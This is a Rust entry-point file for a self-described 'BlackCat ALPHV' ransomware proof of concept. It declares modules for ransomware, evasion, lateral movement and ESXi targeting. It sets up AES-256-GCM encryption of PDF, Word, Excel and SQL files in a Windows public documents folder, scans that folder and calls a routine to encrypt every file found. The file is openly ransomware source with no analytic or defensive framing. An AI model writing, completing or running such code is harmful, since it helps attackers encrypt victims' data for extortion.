mod crypto;
mod filesystem;
mod ransomware;
mod windows;
mod lateral_movement;
mod esxi;
mod evasion;
mod config;
mod linux;

use log::info;

#[tokio::main]
async fn main() -> Result<(), Box<dyn std::error::Error>> {
    env_logger::Builder::from_default_env()
        .filter_level(log::LevelFilter::Info)
        .init();

    info!("BlackCat ALPHV PoC v0.1.0 starting...");

    let target_dir = "C:\\Users\\Public\\Documents";
    
    let config = ransomware::RansomwareConfig {
        target_paths: vec![target_dir.to_string()],
        file_extensions: vec!["pdf", "docx", "xlsx", "sql"].iter().map(|s| s.to_string()).collect(),
        encryption_algorithm: "aes-256-gcm".to_string(),
        max_parallelism: 4,
    };

    info!("Target directory: {}", target_dir);
    info!("Starting encryption process...");

    let files = filesystem::scan_filesystem(target_dir)
        .map_err(|e| format!("Filesystem error: {}", e))?;
    info!("Found {} files", files.len());

    let crypto_engine = crypto::CryptoEngine::new()
        .map_err(|e| format!("Crypto error: {}", e))?;

    match ransomware::BlackCatRansomware::encrypt_all_files(
        files,
        config,
        &crypto_engine,
    ).await {
        Ok(()) => {
            info!("Encryption complete!");
            Ok(())
        },
        Err(e) => {
            eprintln!("Error: {:?}", e);
            Err(format!("{:?}", e).into())
        }
    }
}
